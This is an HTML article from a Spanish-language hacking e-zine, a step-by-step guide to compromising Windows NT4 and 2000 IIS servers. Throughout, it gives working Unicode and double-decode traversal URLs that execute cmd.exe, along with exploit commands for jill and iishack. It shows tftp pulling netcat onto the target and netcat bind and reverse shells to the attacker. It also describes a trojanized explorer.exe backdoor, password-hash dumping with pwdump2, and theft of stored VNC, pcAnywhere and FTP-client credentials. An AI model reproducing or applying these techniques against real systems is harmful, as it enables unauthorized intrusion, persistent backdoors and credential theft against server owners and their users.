<html>
<head>
<title>Fallas B&aacute;sicas NT4 y Win2000</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>

<body TopMargin=0 LeftMargin=1 bgcolor="#FFFFFF" text="#000000">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="110" background="Fondo.jpg" height="57">&nbsp;</td>
    <td width="" height="57"><b><font size="+3">Fallas B&aacute;sicas NT4 y Win2000</font></b><br>
      <i><font size="-1">Por DeadSector</font></i></td>
  </tr>
  <tr> 
    <td width="110" background="Fondo.jpg" height="149">ffffffffffffffdsfsdfs</td>
    <td width="" height="149"> 
      <p><b></b></p>
      <p align="justify">El motivo de este articulo es dar una explicaci&oacute;n de las fallas 
        com&uacute;nmente encontradas en Windows NT, los errores de los administradores 
        y una peque&ntilde;a descripci&oacute;n de el manejo de las herramientas 
        mencionadas.</p>
      <p><b><font color="#0000FF">Las herramientas mencionadas en este articulo 
        son:</font></b></p>
      <p>pulist.exe = Te da listado de programas corriendo en Server y n&uacute;meros 
        PID. <br>
        B&aacute;jalo de ftp.microsoft.com<br>
        troyano.exe = Usa tu favorito, aqu&iacute; usamos el netbus 1.7 modificado. 
        B&aacute;jalo <br>
        de www.raza-mexicana.org<br>
        explorer.exe = By Vlad. Ejecuta un troyano al hacer login el admin. B&aacute;jalo 
        <br>
        de www.raza-mexicana.org<br>
        pwdump2.exe = Saca hash de passwords para ser crackeados despu&eacute;s.<br>
        nc.exe = Netcat para NT, para sacar un shell de Server.<br>
        kill.exe = Permite terminar ciertos procesos en NT.<br>
        cerberus = Scanner para buscar fallas en Server.<br>
        superscan = Scanner de puertos.<br>
        tftp.exe = Server de tftp.</p>
      <p align="justify">Empecemos con el t&iacute;pico scan de puertos con superscan, el cual 
        nos dice cuales puertos tiene abiertos y accesibles desde fuera, una vez 
        dentro comparamos con resultado de &quot;netstat -an&quot; as sabremos 
        si est&aacute;n cerrados o simplemente bloqueados por firewall.</p>
      <p align="justify">Encontramos puertos de ftp, web server, file and printer sharing, pcanywhere 
        y VNC abiertos.</p>
      <p align="justify">Seguimos con scan de cerberus el cual nos dir&aacute; que fallas tiene 
        el web server, shares, ftp, etc.</p>
      <p align="justify">Por ultimo checamos si el server tiene bug de extended unicode o cgi 
        filename decode error. Esto lo puedes hacer con script o directamente 
        con internet explorer checando los diferentes directorios.</p>
      <p><br>
        UNICODE<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/cgi-bin/..$c0%af../winnt/system32/cmd.exe?/c+dir<br>
        http://server/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir<br>
        http://server/iisadmpwd/..%c0%af../cmd.exe?/c+dir<br>
        http://server/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir</font></p>
      <p>CGI FILENAME DECODE ERROR<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/cgi-bin/..%255c..%255cwinnt/system32/cmd.exe?/c+dir<br>
        http://server/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir<br>
        http://server/msadc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir<br>
        http://server/iisadmpwd/..%255c../cmd.exe?/c+dir+c:\</font></p>
      <p>No solo %c0%af funciona, puedes intentar %c1%1c ,%c0%9v ,%c0%qf ,%c1%8s 
        <br>
        ,%c1%9c ,%c1%pc .</p>
      <p><b><font color="#0000FF">Ahora ya tienes la informaci&oacute;n necesaria 
        para empezar.</font></b></p>
      <p align="justify">Lo que buscamos es control total del servidor. Se debe conseguir acceso 
        al server y mantenerlo durante el tiempo posible.</p>
      <p>No buscamos hacer un defacement est&uacute;pido y sin sentido.<br>
        No buscamos cambiar calificaciones porque vas mal en la escuela.<br>
        No buscamos formatear 3 o 4 computadoras porque un ircop te dio kill.<br>
        No buscamos espiar al partido pol&iacute;tico de la oposici&oacute;n o 
        espionaje empresarial.<br>
        No buscamos borrar archivos ni formatear la computadora solo porque el 
        admin te cae mal.<br>
        No buscamos robar tarjetas de cr&eacute;dito para comprar porno, ni para 
        comprar una guitarra a un amigo, ni comprar regalos a tu novia o una gorrita 
        31337 que diga &quot;ROOT&quot;</p>
      <p align="justify">&quot;Como cambio mis calificaciones?&quot; = Estudiando. Las respuestas 
        est&aacute;n enfrente de ti, han estado ah&iacute; todo el tiempo, escucha 
        a tu maestro, lee los libros haz tu tarea, no seas un z&aacute;ngano.</p>
      <p align="justify">El scan se debe expander a todas las m&aacute;quinas de la red, no solo 
        al servidor. La mayor parte de la informaci&oacute;n esta en las maquinas 
        de los admins o gente de soporte. En un pwl puede estar el pass de admin 
        de un server y en el 90% de los casos tienen grabados los passwords en 
        archivos como cuteftp, wsftp, eudora, netscape, vnc, icq, pcanywhere, 
        napster y en unos casos en MYDOCUMENTS en un archivo llamado IMPORTANTE.XLS 
        o IMPORANTE.DOC.</p>
      <p><br>
        <font color="#0000FF"><b>CHECANDO FTP :</b></font></p>
      <p align="justify">Lo primero de la lista fue el ftp, aqu&iacute; solo buscamos lo b&aacute;sico. 
        Ver si tenemos acceso con cuenta an&oacute;nima o con alguna cuenta que 
        sali&oacute; de cerberus. Si tienes acceso checa si puedes ver c:\ d:\ 
        o cualquier directorio importante. Buscar alg&uacute;n archivo que contenga 
        un password. Ver si tenemos derecho a escribir en alg&uacute;n directorio, 
        ya sea solo web, c:\ etc. Inclusive se podr&iacute;a hacer un dir llamado 
        cgi-bin que te permita ejecutar tus archivos desde web. Si tienes acceso 
        a c:\ subes explorer.exe y troyano y esperas que el admin haga login.</p>
      <p align="justify">Este programa (EXPLORER.EXE) se ejecuta cuando hace login el admin, para 
        mas informaci&oacute;n lee la info que viene en el zip. EXPLORER.EXE ejecutara 
        el troyano y despu&eacute;s el explorer.exe original de c:\winnt Todo 
        esto sucede invisible y el admin no se da cuenta de nada.</p>
      <p>Una explicaci&oacute;n mas detallada de como ejecutar desde web o explorer.exe 
        viene mas adelante.</p>
      <p align="justify">Si eres alg&uacute;n ni&ntilde;o llamado Carlitos y solo se te ocurre 
        usar esta falla para subir un est&uacute;pido<br>
        html diciendo que rulas y que haz &quot;rooteado&quot; el servidor Nt 
        estas limit&aacute;ndote demasiado,<br>
        alguien as&iacute; seria y creo que seguir&iacute;a siendo por mucho tiempo 
        un Grand&iacute;simo Pendejo. Y cr&eacute;anme que existe gente as&iacute;, 
        los he visto, son de esos &quot;S&uacute;per 31337 hax0rs 4 ev3r rulz!!&quot; 
        que piensan que todo mundo les envidia su elitismo inexistente; Carlitos, 
        un servidor NT <br>
        JAMAS puede ser &quot;rooteado&quot; grand&iacute;simo animal. NO existe 
        root en NT.</p>
      <p><br>
        <font color="#0000FF"><b>CHECANDO WEB SERVER</b></font></p>
      <p align="justify"><b><font color="#0000FF">FRONTPAGE</font></b><br>
        Continuamos con web server, nunca olvides checar el acceso al web server 
        usando FrontPage, aun existen demasiados webs con FrontPage sin password. 
        FrontPage te permite subir archivos al server, incluyendo ejecutables 
        y puedes dar privilegios a los directorios para que te permitan ejecutar 
        progs desde web, solo tienes que IMPORTAR tu archivo al web server y listo. 
        Si te vas a las propiedades del server puedes sacar la lista de usuarios 
        del servidor.</p>
      <p>Este solo es el primer paso, de aqu&iacute; puedes controlar el servidor, 
        pero eso depende de ti.</p>
      <p align="justify">Si eres alg&uacute;n &quot;cyberh4x0r Rul3z ph33r me&quot; y solo se 
        te ocurre usar FrontPage para poner tu html que dice: &quot;OWNED! aqu&iacute; 
        no hay seguridad, denme trabajo!! Yo si se!! admin mail me!&quot; y cuando 
        el admin te pide ayuda lo &uacute;nico que sabes es decir con letras y 
        n&uacute;meros: &quot;4rr3gl4 tu Fr0nt P4g3 ! Usa Linux!! NT tiene demasiadas 
        f4ll4s !&quot; entonces tambi&eacute;n suckeas y eres digno de llevar 
        el nombre de Pendejo a donde quiera que vayas, y si, aunque no lo crean 
        tambi&eacute;n existe gente as&iacute;.</p>
      <p align="justify"><br>
        <font color="#0000FF"><b>WINDOWS2000</b></font><br>
        Si el server es W2k y no esta parchado contra el overflow de HTTP, print 
        request o Windows 2000 Internet Printing ISAPI Extensi&oacute;n Overflow 
        como tambi&eacute;n se le conoce, podr&iacute;as conseguir acceso al server 
        con privilegios de LOCAL SYSTEM y de ah&iacute; conseguir pass de admin. 
        Porque digo conseguir admin si ya se tiene system? Porque con system vales 
        pito en el dominio, domain admin es lo que importa, as&iacute; controlas 
        TODAS las maquinas del dominio y no solo esa. Para esto solo usas xploits 
        como jill.c para mandar una sesi&oacute;n de command prompt a tu maquina.</p>
      <p>Primero usas NC para abrir un puerto en tu maquina y esperar la shell.</p>
      <p><font size="-1" face="Courier New, Courier, mono">nc.exe -l -p 8080 &lt;--- 
        Esto abre el puerto 8080 en tu maquina.</font></p>
      <p>Luego ejecutas jill en tu maquina y pides el shell a puerto 80 de tu 
        maquina con:</p>
      <p><font size="-1" face="Courier New, Courier, mono">jill sever.com 80 tu-maquina-ip 
        tu-puerto<br>
        jill www.server.com 80 127.0.0.1 8080 &lt;-- substituye 127.0.0.1 por 
        tu ip</font></p>
      <p>Y en la pantalla donde tienes nc.exe escuchando debe salir el t&iacute;pico:</p>
      <p><font size="-1" face="Courier New, Courier, mono">Microsoft Windows 2000 
        [Version 5.10.6578]<br>
        (C) Copyright 1985-2000 Microsoft Corp.</font></p>
      <p><font size="-1" face="Courier New, Courier, mono"> C:\&gt;_</font></p>
      <p align="justify"><br>
        <font color="#0000FF"><b>IISHACK1.5 y NT4</b></font><br>
        Otra manera de conseguir LOCAL SYSTEM en NT4 seria usando el iishack1.5 
        de eeye. Este prog utiliza 2 fallas de NT. Primero un bug del web server 
        para subir el .asp y despu&eacute;s <br>
        otro overflow que se ejecuta al pedir ese asp.</p>
      <p>Este es entre los favoritos de los scriptkiddies, porque solo basta con 
        correrlo.</p>
      <p><font size="-1" face="Courier New, Courier, mono">iishack1.5.exe www.server.com 
        80 6969</font></p>
      <p align="justify">Esto busca la falla remota en server puerto 80 y si la encuentra sube 
        el ..asp, luego lo ejecuta y abre el puerto 6969.</p>
      <p>as&iacute; que solo haces telnet a server puerto 6969 y ya tienes tu 
        shell de LOCAL SYSTEM.<br>
      </p>
      <p><font size="-1" face="Courier New, Courier, mono">Microsoft(R) Windows 
        NT(TM)<br>
        (C) Copyright 1985-1996 Microsoft Corp.<br>
        c:\&gt;_</font></p>
      <p align="justify"><br>
        <font color="#0000FF"><b>IISHACK y NT4</b></font><br>
        Y de los viejitos que aun puedes encontrar de vez en cuando esta el iishack.exe, 
        ese afectaba maquinas NT4 si no ten&iacute;an instalado SP6.</p>
      <p><font face="Courier New, Courier, mono" size="-1">iishack.exe www.server.com 
        80 www.tuserver.org\troyano.exe</font></p>
      <p align="justify">Esto tronaba el web server y lo hacia que bajara tu troyano y lo ejecutara, 
        luego entrabas por telnet si lo que subiste te daba shell o con el cliente 
        de tu troyano.</p>
      <p><br>
        <font color="#0000FF"><b>MSADC</b></font><br>
        De msadc ni voy a hablar porque ya sali&oacute; un art&iacute;culo en 
        boletin 10<br>
        (10-&gt; Sobrepasando Firewalls 101 ......................... ]-( 0x90 
        )--</p>
      <p align="justify">Pero las mismas t&eacute;cnicas que explicare para extended unicode se 
        pueden usar para msadc, solo que en lugar de hacerlo desde internet explorer 
        se hacen con script msadc.pl y sin ver los resultados que te da el server.</p>
      <p></p>
      <p align="justify"><font color="#0000FF"><b>EXTENDED UNICODE &amp; CGI FILENAME 
        DECODE ERROR</b></font><br>
        Las fallas de extended unicode y cgi filename decode error funcionan enga&ntilde;ando 
        al webserver, lo que hacen es brincar restricci&oacute;n de directorio 
        root permiti&eacute;ndote salir a resto de disco, esto solo funciona si 
        cmd.exe se encuentra en mismo disco que dir que estas <br>
        pidiendo.</p>
      <p>El extended unicode lo utiliza mandando el equivalente a / = %c0%af</p>
      <p>El cgi filename convierte el \ en %5c HEX<br>
        despu&eacute;s convierte de nuevo %5c en '%' = %25 '5' = %35 'c' = %63<br>
        Lo haces de nuevo y tienes las variables %255c %%35c %%35%63 %25%35%63</p>
      <p>Por ejemplo si pides /scripts/.../cmd.exe?/c+dir<br>
        <font size="-1" face="Courier New, Courier, mono">c:\winnt\system32\cmd.exe 
        y d:\inetpub\scripts &lt;---ah&iacute; no funciona ya que no est&aacute;n 
        en mismo disco.</font></p>
      <p>Si pides http:\\server\msadc\..cmd.exe?/c+dir<br>
        <font size="-1" face="Courier New, Courier, mono">c:\winnt\system32\cmd.exe 
        y c:\program files\common files\system\msadc &lt;--- ah&iacute; si funciona.</font></p>
      <p>Esto solo te permite ejecutar comandos con privilegios de cuenta IUSER_nombremaquina.</p>
      <p>Primero tenemos que encontrar que dir te permite ejecutar. Como ya lo 
        dijimos las opciones son:</p>
      <p>UNICODE<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/cgi-bin/..$c0%af../winnt/system32/cmd.exe?/c+dir<br>
        http://server/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir<br>
        http://server/iisadmpwd/..%c0%af../cmd.exe?/c+dir<br>
        http://server/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir</font></p>
      <p>CGI FILENAME DECODE ERROR<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/cgi-bin/..%255c..%255cwinnt/system32/cmd.exe?/c+dir<br>
        http://server/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir<br>
        http://server/msadc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir<br>
        http://server/iisadmpwd/..%255c../cmd.exe?/c+dir+c:\</font></p>
      <p>No solo %c0%af funciona, puedes intentar %c1%1c ,%c0%9v ,%c0%qf ,%c1%8s 
        ,%c1%9c ,%c1%pc</p>
      <p align="justify">Con esto puedes ejecutar cualquier comando como si estuvieras en tu shell 
        de command prompt, usa tu imaginaci&oacute;n. Comandos com&uacute;nmente 
        usados son COPY, DIR, DEL, ATTRIB, MOVE, NETSTAT, etc.</p>
      <p align="justify">Antes de empezar aseg&uacute;rate de tener TFTP server corriendo en tu 
        maquina y las herramientas en el directorio de default. ASEGURATE que 
        esta funcionando, no pierdas tu tiempo si tu isp o firewall tienen bloqueados 
        puerto 69 UDP.</p>
      <p>Desde internet explorer o usando tu script favorito pide:</p>
      <p>UNICODE<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir</font><br>
        CGI FILENAME DECODE<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/scripts/..%255c..%255cwinnt/system32/cmd.exe?/cdir</font><br>
        Esto te dar&aacute; listado de directorio scripts.</p>
      <p>UNICODE<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\</font><br>
        CGI FILENAME<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\</font><br>
        Esto te dar&aacute; listado de dir c:\</p>
      <p>UNICODE<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/scripts/..%c0%af../winnt/system32/cmd.exe?/c+type+c:\boot.ini</font><br>
        CGI FILENAME<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+type+c:\boot.ini</font><br>
        Esto ejecuta el comando TYPE y te da el contenido de archivo boot.ini</p>
      <p>UNICODE<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/scripts/..%c0%af../winnt/system32/netstat.exe?-an</font><br>
        CGI FILENAME<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/scripts/..%255c..%255cwinnt/system32/netstat.exe?-an</font><br>
        Esto te da listado de puertos abiertos en server y las conexiones activas.</p>
      <p align="justify">Compara esto con el listado de puertos que te dio el scanner. Si con 
        scanner solo pod&iacute;as ver<br>
        puerto 80 pero con netstat puedes ver que tienen abiertos 21, 80, 110, 
        1024, etc, entonces sabes que tienen alg&uacute;n tipo de firewall. El 
        tipo de ataque cambia dependiendo del firewall.</p>
      <p>UNICODE<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/scripts/..%c0%af../winnt/system32/net.exe?view</font><br>
        CGI FILENAME<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/scripts/..%255c..%255cwinnt/system32/net.exe?view</font><br>
        Esto te da listado de maquinas en ese Dominio, muchas de ellas pueden 
        estar compartiendo los discos.</p>
      <p>UNICODE<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/scripts/..%c0%af../winnt/system32/net.exe?view+/domain</font><br>
        CGI FILENAME<br>
        <font size="-1" face="Courier New, Courier, mono">http://server/scripts/..%255c..%255cwinnt/system32/net.exe?view+/domain</font><br>
        Esto te da listado de DOMINIOS de esa red.</p>
      <p>Puedes estar as&iacute; todo el mendigo d&iacute;a pero no te lo recomiendo, 
        solo son ejemplos.</p>
      <p align="justify">Esto seria lo siguiente para conseguir acceso a un server.<br>
        <font size="-1" face="Courier New, Courier, mono">http://.../cmd.exe?/c+tftp+-i+TuMAQUINA+get+nc.exe+c:\nc.exe</font></p>
      <p align="justify">Ojo, estoy abreviando el server.com/scripts/blah blah blah. tu lo tienes 
        que poner completo en tu browser, esto har&iacute;a que tu el server baje 
        de tu maquina el nc.exe y lo guarde en c:\</p>
      <p align="justify">Porque en c:\ ? para evitar pedos, a veces esta configurado el server 
        para que no cualquiera pueda escribir a dir de web o cualquier directorio, 
        pero siempre se puede escribir en c:\. o casi siempre. Solo he encontrado 
        un server donde cerraron casi todo.</p>
      <p align="justify">Ese d&iacute;a batalle pero encontr&eacute; la manera de subir troyano 
        y ejecutarlo. Como? Aunque tenia cuenta de admin no me dejaba pero dejaron 
        un directorio donde pod&iacute;a escribir. Era el de antivirus, norton 
        creo o mcafee. Apague el servicio antivirus desde computer manager, me 
        fije el nombre de ejecutable, sub&iacute; mi troyano a ese dir con ese 
        nombre, volv&iacute; a arrancar el servicio de antivirus y T&oacute;mala! 
        Se ejecuta el troyano, todo gracias al antivirus.</p>
      <p>Continuemos. Ahora ya tenemos c:\nc.exe solo falta ejecutarlo y entrar 
        por telnet.<br>
        <font size="-1" face="Courier New, Courier, mono">http://.../cmd.exe?/c+c:\nc.exe+-l+-p+3000+-e+cmd.exe</font></p>
      <p align="justify">Esto te da un shell de command prompt en el puerto 3000. Solo haces telnet 
        a ese puerto.<br>
        Si tienen alg&uacute;n firewall has que el servidor te mande el command 
        prompt a tu maquina.</p>
      <p>Primero corre en tu maquina NC.EXE -l -p 80<br>
        Esto hace que netstat escuche en tu puerto 80 y espere alguna conexi&oacute;n, 
        luego pides al server.<br>
        <font size="-1" face="Courier New, Courier, mono">http://.../cmd.exe?/c+c:\nc.exe+TUMAQUINA+80+-e+cmd.exe</font></p>
      <p align="justify">Esto hace que el server haga un conexi&oacute;n al puerto 80 de tu maquina 
        y te mande sesi&oacute;n de<br>
        command prompt.</p>
      <p align="justify">Una vez dentro, tienes que subir EXPLORER.EXE y TROYANO.EXE a dir c:\ 
        El explorer.exe de vlad@raza-mexicana.org hace que cuando el admin haga 
        login ejecute autom&aacute;ticamente el troyano, despu&eacute;s el verdadero 
        c:\winnt\explorer.exe este programa lo puedes bajar de www.raza-mexicana.org</p>
      <p align="justify">Despu&eacute;s ejecutas PULIST.EXE o TLIST.EXE (el que tengas) y apuntas 
        todos los nombres y PIDS de los programas que est&aacute;n corriendo. 
        Luego con NET START te dir&aacute; que servicios est&aacute;n corriendo, 
        apunta todo. Busca en todos los directorios y en todos los HD que encuentres, 
        apunta que software tienen instalado, checa las fechas, cuales son los 
        que mas utilizan?</p>
      <p>Quieres mas backdoors? Copia CMD.EXE a scripts, otro buen lugar para 
        cmd.exe <br>
        Seria c:\program files\common files\system\msadc</p>
      <p align="justify">Ren&oacute;mbralo a otra cosa, si pides desde web a cmd.exe que redireccione 
        algo a &gt;archivo no te deja, pero si se llama de otra manera si te deja. 
        Por ejemplo http://server/scripts/cmd.exe?/c+dir+&gt;dir.txt no funciona 
        <br>
        Pero http://server/scripts/elcmdexe.exe?/c+dir+&gt;dir.txt si funciona</p>
      <p align="justify"><br>
        <b><font color="#0000FF">CUENTAS y SHARES</font></b><br>
        Lo que buscamos son cuentas con pass en blanco o pass igual a login, si 
        consigues pass de<br>
        ADMINISTRADOR que bien, si es un simple USER puedes elevar tus privilegios. 
        Recuerda que un USER puede escribir a C:\ o prender y apagar ciertos servicios.</p>
      <p align="justify">Los shares C$ D$ solo pueden ser utilizadas si eres admin, No importa 
        que solo puedas montar IPC$ como USER, esto servir&iacute;a de mucho. 
        Muchos passwords est&aacute;n en registro de windows y pueden ser sacados 
        luego crackeados usando una simple cuenta de USER. Solo tienes que mapear 
        IPC$ correr regedit en tu maquina y seleccionar CONNECT NETWORK REGISTRY.</p>
      <p>Por ejemplo VNC y EXCHANGE, puedes sacar el pass encryptado de VNC y 
        crackearlo.</p>
      <p align="justify">Si conseguiste acceso a c:\ busca en todos los directorios, lo que buscamos 
        son archivos que<br>
        contengan passwords, archivos como WS_FTP.INI, cuteftp SMDATA.DAT, pcanywhere 
        USER.CIF, EUDORA.INI, etc.</p>
      <p align="justify">Sube explorer.exe y troyano a c:\ y espera que el admin haga login, esto 
        te conseguir&aacute; un backdoor para regresar en futuro.</p>
      <p align="justify"><br>
        <b><font color="#0000FF">QUE MAS???</font></b><br>
        Bueno no importa que usaste para entrar, una vez que consigues admin puedes 
        snnifear el trafico de la red, puedes conseguir pass de otras m&aacute;quinas, 
        hacer lo que quieras.</p>
      <p>A veces no es suficiente cambiar el pass de ranita a ranita1.</p>
      <p align="justify">Si sabes que alguien entro a tu maquina lo recomendable es FORMATEAR, 
        no puedes confiar en un server despu&eacute;s de que alguien entro.</p>
      <p align="justify">Como sacar los passwords? Si ya tienes privilegios de admin solo ejecuta 
        pulist y apunta el PID de LSASS, luego ejecutas en el server pwdump2.exe 
        48 &lt;-- en caso de que ese fuera el pid esto te da listado de hash a 
        pantalla. Si quieres grabar a archivo seria pwdump2.exe 48 &gt; passwords-hash.txt</p>
      <p align="justify">Ahora sube password-hash.txt a tu maquina y usa l0phtcrack o LC3 como 
        ahora se llama para crackear los passwords.Si conseguiste smdata.dat instala 
        cuteftp en tu maquina y metelo a ese directorio, luego corres cuteftp 
        y con REVELATION ves los passwords detr&aacute;s de los ********** si 
        sacaste WS_FTP.INI o alg&uacute;n otro ini de la misma manera los puedes 
        crackear o simplemente busca un prog que desencripte estos passwords.</p>
      <p align="justify"><br>
        <font color="#0000FF"><b>PCANYWHERE</b></font><br>
        Te acuerdas que sali&oacute; ese puerto abierto? Busca los archivos *.cif 
        de directorio:<br>
        c:\program files\pcanywhere\data\ o c:\program files\symantec\pcanywhere\data<br>
        O en cualquier lugar donde puedan estar los *.cif, muchas veces los tienen, 
        baja esos a tu maquina. Instalas PCANYWHERE v.8 en tu maquina. y con REVELATION 
        sacas los pass detr&aacute;s de ************</p>
      <p align="justify">OJO dije versi&oacute;n 8 ( ocho ) no dije 9 ni 9.2 ni 10. dije 8 ( ocho 
        )</p>
      <p>Solo selecciona archivo.cif y con bot&oacute;n derecho seleccionas PROPERTIES 
        luego ventana de SETTINGS y ah&iacute; viene el ***** con revelation sale 
        el pass. Prendes pcanywhere y entras al server, el login ser&aacute; el 
        nombre de archivo.</p>
      <p align="justify"><br>
        <b><font color="#0000FF">WINVNC</font></b><br>
        Para los que no lo conocen VNC es uno de mis programas favoritos. Funciona 
        parecido a pcanywhere, pero es gratuito y mide muy poco, el &uacute;nico 
        problema es que la seguridad la tienes que configurar directamente al 
        registro de windows. desde registro tu decides de cuales ips pueden entrar. 
        y cosas por el estilo. Eso nos conviene ya que nadie lo hace o no saben 
        como, cualquier usuario puede leer el registro y sacar el pass encriptado. 
        Desde command prompt puedes pedir comando.</p>
      <p><font size="-1" face="Courier New, Courier, mono">regedit /e vnc.reg 
        HKEY_LOCAL_MACHINE\Software\ORL\WinVNC3</font><br>
        o<br>
        <font size="-1" face="Courier New, Courier, mono">regedit /e vnc.reg HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Default</font></p>
      <p align="justify">Esto mandar&iacute;a el contenido de winvnc a archivo reg y de ah&iacute; 
        puedes ver el pass y desencriptarlo usando cracker para winvnc.lo, puedes 
        bajar de aqu&iacute;: VNCrackX4 by Phenoelit (www.phenoelit.de)</p>
      <p align="justify">Ya con ese pass entras al server de vnc desde internet explorer o usando 
        el cliente de WINVNC.<br>
        http://server:5800 (o 5900 no recuerdo el puerto exacto)</p>
      <p></p>
      <p align="justify"><b><font color="#0000FF">EXCHANGE</font></b><br>
        Este tambi&eacute;n guarda los passwords encriptados en registro y cualquiera 
        los puede leer, solo es cuesti&oacute;n de sacar los pass y usar el algoritmo 
        para conseguir el clear text pass. busca en securityfocus.com . ah&iacute; 
        viene la manera de desencriptarlos f&aacute;cilmente. Solo necesitas papel 
        y l&aacute;piz.</p>
      <p align="justify">Una manera de ver el registro es mapear un share, ejecutas regedit en 
        tu maquina y seleccionas opci&oacute;n de CONNECT NETWORK REGISTRY.</p>
      <p><br>
        <b><font color="#0000FF">AT</font></b><br>
        El comando AT puede ser utilizado para ejecutar programas en server con 
        privilegios de LOCAL SYSTEM. Mapeas un share como admin, ya sea IPC$ o 
        el que quieras luego das en tu maquina el comando<br>
        <font size="-1" face="Courier New, Courier, mono">NET TIME \\127.0.0.1 
        &lt;-- el ip del server</font><br>
        Te dar&aacute; la fecha y hora de server.<br>
        <font size="-1" face="Courier New, Courier, mono">Current time at \\127.0.0.1 
        is 4/10/2001 06:56 AM</font><br>
        Y si quieres que se ejecute a las 7 das el comando<br>
        <font size="-1" face="Courier New, Courier, mono">AT \\127.0.0.1 7:00AM 
        &quot; &quot;calc.exe&quot; &quot;</font><br>
        Eso ejecutar&iacute;a el prog calc.exe a las 7am con privilegios de LOCAL 
        SYSTEM.</p>
      <p align="justify">Si esta apagado el servicio AT lo puedes prender desde tu maquina. En 
        W2k te vas a control panel ADMINISTRATIVE TOOLS y ejecutas COMPUTER MANAGEMENT, 
        luego ACTION y CONNECT TO ANOTHER COMPUTER. De ah&iacute; puedes prender 
        servicios, rebootear maquina, borrar logs, etc. tambi&eacute;n existe 
        un prog que puedes bajar del ftp de microsoft; SC.exe, que te permite 
        modificar servicios desde command prompt. Vale la pena bajarlo junto con 
        pulist, kill y otros programas desde ftp microsoft.</p>
      <p align="justify">Para prender AT te vas a SERVICES y prendes el TASK SCHEDULER, ahora 
        ya puedes usar AT desde tu maquina.</p>
      <p align="justify">Si la maquina que estas controlando es W2k seleccionas donde dice COMPUTER 
        MANAGEMENT (127.0.0.1) y le picas con bot&oacute;n derecho. luego seleccionas 
        properties.en ADVANCED STARTUP AND RECOVERY trae la opci&oacute;n de SHUTDOWN. 
        sirve si instalaste parche y quieres hacer reboot.</p>
      <p><b><font color="#0000FF">LOGFILES</font></b></p>
      <p>Aunque no lo creas una de las cosas que te puede AYUDAR a conseguir 
      ADMIN son los LOGFILES. si alguien te dice que lo primero que debes hacer 
      al entrar a un server es borrar los logfiles estan equivocados.</p>
      <p>Por lo regular se encuentran en este directorio
      c:\winnt\system32\logfiles<br>
      Ahi te daras cuenta cuando el admin hace login desde otra maquina. ya 
      sea por ftp etc. Dale una checadita a esa otra maquina.<br>
      ya me toco un caso donde el admin tenia mas o menos seguro el server y no se podia hacer 
      nada. pero vi un ip en los logs y su login. al checar esa otra maquina me 
      di cuenta que tenia la misma falla que el server pero ahi tenia grabado su 
      password en un archivo ADMIN.CIF en directorio pcanywhere\data.<br>
      bajas ese archivo a tu maquina sacas el pass y Bingo! puedes entrar al server 
      deseado ahora con tus privilegios de ADMIN.<br><br>
        <b><font color="#0000FF">FIN</font></b></p>
      <p align="justify">Es todo por hoy. Existen mas cosas que se pueden hacer en un server? 
        SI. Me falto algo en este text? SI.</p>
      <p>Quieres escribirme para echarme pedos porque no pudiste hacer algo que 
        dije?<br>
        Quieres contarme de otros bugs que descubriste y que no se han publicado?<br>
        Quieres mentarme la madre porque no me explique correctamente?<br>
        Quieres explicarme como se debe h4x0rear un server?</p>
      <p align="justify">Si respondiste SI a cualquiera de esas preguntas, no pierdas tu tiempo. 
        Casi no contesto los e-mails y muchas veces los borro sin leerlos. Lo 
        que debes hacer es escribir un articulo y mandarlo a raza-mexicana. Coopera 
        con lo poco que puedas.</p>
      <p align="justify">Escribe de lo que sabes, faltan demasiados detalles, fallas, parches, 
        etc, que no se mencionaron aqu&iacute;. Cualquiera de esos seria un buen 
        articulo.</p>
      <p align="justify">Para aquellos que no saben y quieren aprender pueden mandar sus requests. 
        Se pasara a resto de integrantes del team y probablemente saldr&aacute; 
        un articulo hablando de eso en pr&oacute;ximo Ezine.</p>
      <p align="justify">Para los newbies que apenas empiezan. Me gustar&iacute;a 
        ense&ntilde;arles lo hermoso que es encontrar una soluci&oacute;n a un 
        problema, compartir lo que se siente al ayudar a un amigo a reparar su 
        maquina o parchar su server. Por favor ev&iacute;tenme la pena de rayarles 
        la madre y no manden correos pidiendo hackear un server por x raz&oacute;n.</p>
      <p align="justify">Me gustar&iacute;a juntar un team de 300 newbies y ense&ntilde;arles 
        lo poco que se, siempre ha sido mi sue&ntilde;o. Si te crees lo suficiente 
        newbie env&iacute;ame un email, cuando juntemos 300 empezamos.</p>
      <p><br>
        Nos vemos.<br>
      </p>
      <p></p>
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td>
            <div align="left"><a href="rm-12-01.htm"><img src="i.gif" width="88" height="30" border="0" alt="Asegurando un poco tu Redhat 6"></a></div>
          </td>
          <td>
            <div align="right"><a href="rm-12-03.htm"><img src="d.gif" width="88" height="30" border="0" alt="Robin hood de la red"></a></div>
          </td>
        </tr>
      </table>
